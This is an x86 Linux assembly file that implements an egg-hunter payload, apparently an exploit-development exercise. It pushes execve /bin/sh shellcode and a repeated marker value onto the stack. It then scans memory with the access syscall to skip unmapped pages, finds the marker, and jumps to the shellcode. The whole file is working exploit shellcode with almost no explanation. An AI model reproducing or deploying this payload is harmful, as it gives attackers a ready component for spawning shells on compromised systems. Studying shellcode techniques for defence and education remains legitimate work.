global _start

section .text
_start:
; push our /bin/sh shellcode onto the stack
        push 0x80cd0bb0
        push 0x04244c8d
        push 0x5424148b
        push 0x50e3896e
        push 0x69622f68
        push 0x68732f2f
        push 0x6850c031
; push our identifier
        push 0x50905090
        push 0x50905090

; Stat of the egg hunter shellcode
        mov     ebx, 0x50905090                 ; set ebx with our value to hunt for
        mov ecx, 0x0
        mov edx, 0x0
page_allign:
        or      dx, 0xffff
next_loc:
        inc edx
        pusha
        lea ebx, [edx+0x4]
        mov eax, 0x21
        int 0x80
        cmp al, 0xf2
        popa
        jz page_allign
        cmp [edx], ebx
        jnz next_loc
        cmp [edx+0x4], ebx
        jnz next_loc
        jmp edx
